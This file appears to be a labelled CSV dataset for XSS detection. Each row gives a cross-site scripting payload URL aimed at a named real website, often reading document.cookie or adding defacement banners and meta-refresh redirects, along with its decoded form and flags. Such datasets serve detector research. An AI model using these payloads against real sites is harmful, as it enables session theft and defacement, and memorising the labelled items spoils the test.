Payloads,Class,decoded,executed,parser_changed
http://goalandsales.com/index.php?page=props.php&amp;cat=2&amp;app=7&amp;mtag=&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious,http://goalandsales.com/index.php?page=props.php&cat=2&app=7&mtag=<script>alert(/xss/)</script>,True,True
http://ms137.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms137.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
https://renewus.avg.com//index.php?option=com_wdshop&view=userinfo&ajax_json=ajax_fill_city_state&format=raw&zip=%27%22--%3e%3c/style%3e%3c/script%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"https://renewus.avg.com//index.php?option=com_wdshop&view=userinfo&ajax_json=ajax_fill_city_state&format=raw&zip='""--></style></script><script>alert(document.cookie)</script>",True,True
http://www.9bis.net//kitty/?zone=&amp;page=_%27%22%3e%3cscript%3ealert(1337)%3c/script%3e%3cmarquee%3e%3<br>ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3eunknown_zone,Malicious,"http://www.9bis.net//kitty/?zone=&page=_'""><script>alert(1337)</script><marquee><h1>xss by xylitol</h1></marquee>unknown_zone",True,True
http://folha.shopping.busca.uol.com.br/cds/index.html?q=&lt;script&gt;alert(&quot;xroot owned you!&quot;)&lt;/script&gt;,Malicious,"http://folha.shopping.busca.uol.com.br/cds/index.html?q=<script>alert(""xroot owned you!"")</script>",True,True
http://www.naturalspor.com/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.naturalspor.com/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
http://www.musikverein.at/jugend/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.musikverein.at/jugend/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.ipost.co.kr/list_stock.asp?q=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cm<br>arquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.ipost.co.kr/list_stock.asp?q=""><script>alert(document.cookie)</script>><marquee><h1>by kusomiso.com</h1></marquee>",True,True
http://net-dz.com/all.php?cx=002533184230814951741%3a21ntlwlqrae&amp;q=%22%27%3e%3cscript%3ealert(%27tou<br>ched+by+3n!gma%27)%3b%3c%2fscript%3e&amp;sa.x=39&amp;sa.y=7&amp;ie=utf-8&amp;cof=forid%3a9&amp;itemid=1&amp;gsearch=yes,Malicious,"http://net-dz.com/all.php?cx=002533184230814951741:21ntlwlqrae&q=""'><script>alert('touched by 3n!gma');</script>&sa.x=39&sa.y=7&ie=utf-8&cof=forid:9&itemid=1&gsearch=yes",True,True
http://www.wippell.com/product_html.php?pid=&quot;&gt;&lt;script&gt;alert('xssed_by_samthg')&lt;/script&gt;,Malicious,"http://www.wippell.com/product_html.php?pid=""><script>alert('xssed_by_samthg')</script>",True,True
https://buyiphone.apple.com/webobjects/ipacustomer.woa/wa/ipapreauthaction/homepage?product=mc555ll/<br>a&amp;sf=%22/%3e%3cscript%3ealert%28/securitylab.ir/%29%3c/script%3e,Malicious,"https://buyiphone.apple.com/webobjects/ipacustomer.woa/wa/ipapreauthaction/homepage?product=mc555ll/a&sf=""/><script>alert(/securitylab.ir/)</script>",True,True
http://www.raileurope.com/us/gsearch/search_results.htm?fn=search&amp;wt.seg_1=searchbox&amp;q=%3cscript%3ea<br>lert(%22iblaze%22)%3c%2fscript%3e&amp;fn=search,Malicious,"http://www.raileurope.com/us/gsearch/search_results.htm?fn=search&wt.seg_1=searchbox&q=<script>alert(""iblaze"")</script>&fn=search",True,True
http://fr.888.com/site2/backgammon/default.htm?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://fr.888.com/site2/backgammon/default.htm?lang=""><script>alert(document.cookie)</script>",True,True
http://ms114.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms114.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.t7r.org/search.php?text=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,http://www.t7r.org/search.php?text=<script>alert(document.cookie)</script>,True,True
http://livescore.goal.com/index.php?language=%22%20%27%3e%3cscript%3ealert(1)%3c/script%3e,Malicious,"http://livescore.goal.com/index.php?language="" '><script>alert(1)</script>",True,True
http://www.velocityclicks.com/index.php?view=join&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;!--<br>,Malicious,"http://www.velocityclicks.com/index.php?view=join&ref=""><script>alert(document.cookie);</script><!--",True,True
http://www.hipernet24.pl/se.php?sw=duracell%22%3e%3cscript%3ealert%28/pyske/%29%3c/script%3e,Malicious,"http://www.hipernet24.pl/se.php?sw=duracell""><script>alert(/pyske/)</script>",True,True
http://www.devnull.jp/tdiary/?year=2007%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e;month=3q;catego<br>ry=etc,Malicious,"http://www.devnull.jp/tdiary/?year=2007"">'><script>alert('x')</script>;month=3q;category=etc",True,True
http://zebani.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://zebani.net/directory.php?cat=""><script>alert(document.cookie)</script>",True,True
http://www.sv-kapellen.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.sv-kapellen.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.tochio-tanada.com/cgi-bin/topics/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20<br>-%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious,"http://www.tochio-tanada.com/cgi-bin/topics/newsboard.cgi?num=>""><script>alert('ins - unkn0wn.eu')</script>",True,True
http://www.seg-social.es/internet_1/busquedas/index.htm?ssusertext=%3cscript%3ealert(1)%3c/script%3e<br>%3c%2fh2%3e&amp;fragment1_nextrow=&amp;xgisstema=0&amp;lang=es&amp;buscar=+buscar,Malicious,http://www.seg-social.es/internet_1/busquedas/index.htm?ssusertext=<script>alert(1)</script></h2>&fragment1_nextrow=&xgisstema=0&lang=es&buscar= buscar,True,True
http://www.level3.com/en/search.aspx?searchstr=%22%3e%3cscript%3ealert%28%27xss%20@%20level3%27%29;%<br>3c/script%3e,Malicious,"http://www.level3.com/en/search.aspx?searchstr=""><script>alert('xss @ level3');</script>",True,True
http://www.gridironstrategies.com/articles.php?id=28%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious,"http://www.gridironstrategies.com/articles.php?id=28""><script>alert(document.cookie)</script>",True,True
http://airtel.onspeednx.com/nx/search/?q=www.%3cscript%3ealert(%27cueballr%27)%3c/script%3e&amp;a=1005&amp;s<br>=1&amp;d=1,Malicious,http://airtel.onspeednx.com/nx/search/?q=www.<script>alert('cueballr')</script>&a=1005&s=1&d=1,True,True
"<img src="" &#14; javascript:alert('xss');"">",Malicious,"<img src=""  javascript:alert('xss');"">",True,True
http://www.shikoku.co.jp/namazu.php?query=textfield}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/<br>.source));%3c/script%3e,Malicious,http://www.shikoku.co.jp/namazu.php?query=textfield}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,True,True
http://fox901.u.la/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://fox901.u.la/orz.cgi/-/xssed.com/'>"">'><script>alert(""xss"")</script>",True,True
http://www.defensacivil.gov.co/phppgadmin/redirect.php/%22%3e%3cscript%3ealert(%22xssed%22)%3c/scrip<br>t%3e?subject=server&amp;server=test,Malicious,"http://www.defensacivil.gov.co/phppgadmin/redirect.php/""><script>alert(""xssed"")</script>?subject=server&server=test",True,True
http://www.bestdealmagazines.com/title.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious,"http://www.bestdealmagazines.com/title.asp?title=<script>alert(""scriptorium(turkey)"")</script><metahttp-equiv=""refresh"" content=""0;url=http://www.canixim.com"">",True,True
http://www.juegosdiarios.com/buscador/%22%3e%3cmarquee%3edefaced%20by%20sponsfull%3c/marquee%3e.html;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,Malicious,"http://www.juegosdiarios.com/buscador/""><marquee>defaced by sponsfull</marquee>.html;msg=<script>alert(""xssbydt"")</script>",True,True
http://www.bayerische.staatsoper.de/c.php/index_bso.php?dom=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.bayerische.staatsoper.de/c.php/index_bso.php?dom=""><script>alert(""maxwel"")</script>",True,True
http://uni13.ogame.de/game/redir.php?url=http://%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious,"http://uni13.ogame.de/game/redir.php?url=http://<""<<script>alert(document.cookie)</script>",True,True
http://cslt.shmh.gov.cn/dispbbs.asp?boardid=13&amp;id=282&amp;page=18%27%22%3e%3c/title%3e%3cscript%3ealert(<br>%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marq<br>uee%3e,Malicious,"http://cslt.shmh.gov.cn/dispbbs.asp?boardid=13&id=282&page=18'""></title><script>alert(""xss"");</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>",True,True
http://www.tagesmutter-illertissen.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.tagesmutter-illertissen.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.leprechaunsloot.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,Malicious,"http://www.leprechaunsloot.com/members/login.php?path=""><script>alert(document.cookie);</script>",True,True
http://www.lincoln.com/search-lincoln/?f%3asearchinputstring=moonzorg&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;&amp;f%3asearch=search&amp;formid=globalsearchform,Malicious,"http://www.lincoln.com/search-lincoln/?f:searchinputstring=moonzorg""><script>alert(document.cookie)</script>&f:search=search&formid=globalsearchform",True,True
http://www.zdnetindia.com/index.php?action=article&amp;prodid=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked<br>%20by%20trex&lt;/h1&gt;,Malicious,"http://www.zdnetindia.com/index.php?action=article&prodid=""><script>alert('trex')</script><h1>hacked by trex</h1>",True,True
http://focus-webapps.ti.com/general/docs/sitesearch/searchdevice.tsp;jsessionid=iwfxvz3vt02gjqc1jawc<br>m4q?partnumber=%22+%27%3e%3cscript%3ealert(%27cueballr%27)%3c%2fscript%3e,Malicious,"http://focus-webapps.ti.com/general/docs/sitesearch/searchdevice.tsp;jsessionid=iwfxvz3vt02gjqc1jawcm4q?partnumber="" '><script>alert('cueballr')</script>",True,True
http://www.mavigezegen.com/enter.php?lang=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,Malicious,"http://www.mavigezegen.com/enter.php?lang=""><script>alert(/the-sh0ck-b0y/)</script>",True,True
http://absholdings.biz/?s=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e,Malicious,"http://absholdings.biz/?s=""><script>alert(document.cookie)</script>",True,True
http://simcitysocieties.ea.com/index.php?languagecode=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e,Malicious,"http://simcitysocieties.ea.com/index.php?languagecode='""></title><script>alert(1337)</script>",True,True
http://www.e-kent.com/content/destek/destekkb_home.asp?cat_name=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;<br>hacked%20by%20trex&lt;/h1&gt;,Malicious,"http://www.e-kent.com/content/destek/destekkb_home.asp?cat_name=""><script>alert('trex')</script><h1>hacked by trex</h1>",True,True
http://www.rcbazaar.com/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.rcbazaar.com/phpinfo.php?a[]=""><script>alert(document.cookie)</script>",True,True
http://www.alexa.com/data/details/?url=http://www.xssed.com/%22%3e/%3e'%3e%3cscript%3e%3c/script%3e%<br>3cimg%20src=no_such_icon%20onerror=alert(document.cookie);%3e%3cscript%3ealert(%22herkese+iyi+ramaza<br>nlar%22)%3c/script%3e,Malicious,"http://www.alexa.com/data/details/?url=http://www.xssed.com/"">/>'><script></script><img src=no_such_icon onerror=alert(document.cookie);><script>alert(""herkese iyi ramazanlar"")</script>",True,True
http://examenbundel.roadside.nl/vwo/?examen=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://examenbundel.roadside.nl/vwo/?examen=""><script>alert(123)</script>",True,True
"http://www.arcor.de/content/senden.jsp?to=""><script>alert(document.cookie)</script>&headline=x&url=x&datum=x&teasertext=x",Malicious,"http://www.arcor.de/content/senden.jsp?to=""><script>alert(document.cookie)</script>&headline=x&url=x&datum=x&teasertext=x",True,True
http://lxr.linux.no/+trees/+prefs?return=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p%20&quot;,Malicious,"http://lxr.linux.no/ trees/ prefs?return=""><script>alert(document.cookie)</script><p """,True,True
http://www.kplusk.org/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.kplusk.org/cms/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
https://suned.sun.com/apps/us/sesweb?country_code=us&amp;app_type=sesweb&amp;action=login2&amp;processor=student<br>&amp;user_id=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by<br>+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;password=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit=%c2%a0log+in+%c2%bb%c<br>2%a0,Malicious,"https://suned.sun.com/apps/us/sesweb?country_code=us&app_type=sesweb&action=login2&processor=student&user_id='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&password='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&submit= log in » ",True,True
http://www.telefonicachile.cl/apps/formularios/contactenos/form_contacto.php?tp='%22%3e%3cscript%3ea<br>lert('whk')%3c/script%3e,Malicious,"http://www.telefonicachile.cl/apps/formularios/contactenos/form_contacto.php?tp='""><script>alert('whk')</script>",True,True
http://www.aliraif.com.tr/urunler.asp?baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,Malicious,"http://www.aliraif.com.tr/urunler.asp?baslik=<script>alert(""scriptorium(turkey)hackhaber.com"")</script>",True,True
http://www.dunken.se/sokprodukter.asp?sokord=%3cscript%3ealert%28123%29%3c%2fscript%3e,Malicious,http://www.dunken.se/sokprodukter.asp?sokord=<script>alert(123)</script>,True,True
http://wp.nu/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://wp.nu/index.php/""><script>alert(1);</script>",True,True
http://www.mavigezegen.com/enter.php?lang=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,Malicious,"http://www.mavigezegen.com/enter.php?lang=""><script>alert(/the-sh0ck-b0y/)</script>",True,True
http://sitesearch.websidestory.com/?q=xss+holes%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e&amp;x=0&amp;y<br>=0,Malicious,"http://sitesearch.websidestory.com/?q=xss holes<script>alert(""xss"")</script>&x=0&y=0",True,True
http://nvd.nist.gov/nvd.cfm?cvename=cve-2007-3987%3c/title%3e%22%3e'%3e%3cscript%3ealert('xss')%3c/s<br>cript%3e,Malicious,"http://nvd.nist.gov/nvd.cfm?cvename=cve-2007-3987</title>"">'><script>alert('xss')</script>",True,True
http://www.wetter.de/shared/php/search_plz_ort.php?in=%253c%2500%253cscript%253ealert%28navigator.us<br>eragent%29%253c/script%253e,Malicious,http://www.wetter.de/shared/php/search_plz_ort.php?in=<,True,True
http://login.kataweb.it/registrazione/m2o/utenteregistrato.jsp?backurl=%22%3e%3cscript%3ealert%28%2f<br>xss+by+redtuning%2f%29%3b%3c%2fscript%3e,Malicious,"http://login.kataweb.it/registrazione/m2o/utenteregistrato.jsp?backurl=""><script>alert(/xss by redtuning/);</script>",True,True
http://vilniustsv.stat.gov.lt/lt/search/?phpsessid=db5257ed38becc11c3e54f30b944b2c3&amp;query=x%22%3e%27<br>%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22&amp;x=0&amp;y=0,Malicious,"http://vilniustsv.stat.gov.lt/lt/search/?phpsessid=db5257ed38becc11c3e54f30b944b2c3&query=x"">'><script>alert(123)</script>""&x=0&y=0",True,True
http://help.naver.com/service/svc_index.jsp?selected_nodeid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://help.naver.com/service/svc_index.jsp?selected_nodeid=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://56.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://56.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.ds-revolution.net/index.php?view=register&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://www.ds-revolution.net/index.php?view=register&ref=""><script>alert(document.cookie);</script>",True,True
http://www.barnesandnoble.com/newsletters/unsubscribe/barnesandnoble.asp?emailaddr=%22%3e%3ciframe%2<br>0src=http://google.com%3e%3c/iframe%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://www.barnesandnoble.com/newsletters/unsubscribe/barnesandnoble.asp?emailaddr=""><iframe src=http://google.com></iframe><script>alert(document.cookie)</script>",True,True
"http://www.saab.lv/main/global/en/tirdzn_lietoti1.shtml?id=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious,"http://www.saab.lv/main/global/en/tirdzn_lietoti1.shtml?id=>""><script 
>alert(/xss by turkpower/);</script><h1>xss by turkpower</h1></marquee>",True,True
http://www.barbatmitzva.co.il/halls.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious,"http://www.barbatmitzva.co.il/halls.asp?title=<script>alert(""scriptorium(turkey)"")</script><metahttp-equiv=""refresh"" content=""0;url=http://www.canixim.com"">",True,True
http://www.somersauctioneers.ie/list.asp?radiobutton=commercial%22%3e%3cscript%3ealert(document.cook<br>ie)%3c/script%3e,Malicious,"http://www.somersauctioneers.ie/list.asp?radiobutton=commercial""><script>alert(document.cookie)</script>",True,True
http://www.srh.noaa.gov/zhu/main/tda.php?sid=huf&amp;timeoutput=z%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.srh.noaa.gov/zhu/main/tda.php?sid=huf&timeoutput=z'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://delin.shayang.gov.cn/chinese/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)<br>%3c/script%3e&amp;smallclassname=&amp;keyword=xss&amp;submit=%cb%d1%cb%f7,Malicious,"http://delin.shayang.gov.cn/chinese/search.asp?field=title&bigclassname=<script>alert(""xss"")</script>&smallclassname=&keyword=xss&submit=����",True,True
http://www.cliquojeux.com/forum.php?var='<script>alert(1337)</script>&der=1,Malicious,http://www.cliquojeux.com/forum.php?var='<script>alert(1337)</script>&der=1,True,True
